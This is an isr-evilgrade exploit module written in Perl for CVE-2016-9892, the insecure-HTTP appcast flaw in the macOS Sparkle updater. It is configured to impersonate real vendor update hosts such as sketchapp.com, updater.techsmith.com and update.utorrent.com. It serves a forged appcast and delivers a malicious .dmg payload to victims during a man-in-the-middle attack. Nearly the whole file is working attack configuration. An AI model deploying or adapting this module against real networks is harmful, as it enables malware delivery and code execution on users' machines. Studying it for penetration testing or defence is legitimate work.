###############
# macos_sparkle_bypass.pm
#
# CVE-2016-9892 - Sparkle Updater Framework insecure HTTP appcast MITM
#
# Sparkle (< 1.13.1) fetches its appcast feed over plain HTTP and renders the
# release notes in a WebView with JavaScript enabled. An attacker on the path
# can replace the appcast, inject JS into the release notes and point the
# <enclosure> at a malicious update, achieving arbitrary code execution.
# Affected hundreds of macOS apps (Camtasia, Sketch, uTorrent, DuetDisplay...).
# Ref: https://thehackernews.com/2016/02/apple-security-vulnerability.html
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
##
package modules::macos_sparkle_bypass;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'macOS Sparkle Updater MITM',
    'version'     => '1.0',
    'appver'      => 'Sparkle < 1.13.1',
    'cve'         => 'CVE-2016-9892',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2016-9892: Sparkle Updater framework insecure HTTP appcast MITM.
Sparkle < 1.13.1 fetches its appcast over HTTP and renders release notes in a
WebView with JavaScript enabled, allowing arbitrary code execution for an
attacker on the path. Serves a crafted appcast whose <enclosure> points at a
malicious .dmg delivered by this same MITM host.
Affected: Camtasia, Sketch, uTorrent, DuetDisplay and many other macOS apps.
},
    # NOTE: evilgrade matches the *request host* (as a regex) against this
    # string, so vh must list literal hostnames of known-vulnerable Sparkle
    # apps. Add the appcast host of whatever target you are testing.
    'vh' => '(sketchapp.com|www.sketchapp.com|updater.techsmith.com|update.utorrent.com|appcast.update.local)',
    'request' => [
        {   'req'    => '/.*appcast.*\.xml|/.*\.appcast',
            'type'   => 'file',           # serve the crafted appcast manifest
            'method' => '',
            'bin'    => 0,
            'string' => '',
            'parse'  => 1,                # expand <%VERSION%> / <%DLHOST%> / etc.
            'file'   => './include/macos_sparkle/appcast.xml',
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/xml\r\n"
                . "Connection: close\r\n\r\n",
        },
        {   'req'    => '/.*\.dmg',        # the enclosure download
            'type'   => 'agent',          # serve the configured binary payload
            'method' => '',
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => '',
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=Update.dmg\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/osx/update_payload.dmg',
            'desc' => 'Agent to inject (malicious .dmg)'
        },
        'enable' => {
            'val'  => 0,
            'desc' => 'Status'
        },
        'dlhost' => {
            'val'  => 'sketchapp.com',
            'desc' => 'Download host written into the appcast enclosure URL (must be one of the vh hosts)'
        },
        'scheme' => {
            'val'  => 'https',
            'desc' => 'URL scheme written into the appcast (http or https). Modern Sparkle uses https.'
        },
        'dmglen' => {
            'val'     => '-s \'./agent/osx/update_payload.dmg\'',
            'desc'    => 'Byte length of the payload, written into the appcast enclosure',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'version' => {
            'val'     => '\'99.\'.isrcore::utils::RndNum(2)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'pubdate' => {
            'val'     => '\'Mon, 01 Jan 2024 00:00:00 GMT\'',
            'hidden'  => 1,
            'dynamic' => 1,
        },
    }
};

##########################################################################
# FUNCTION      new
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
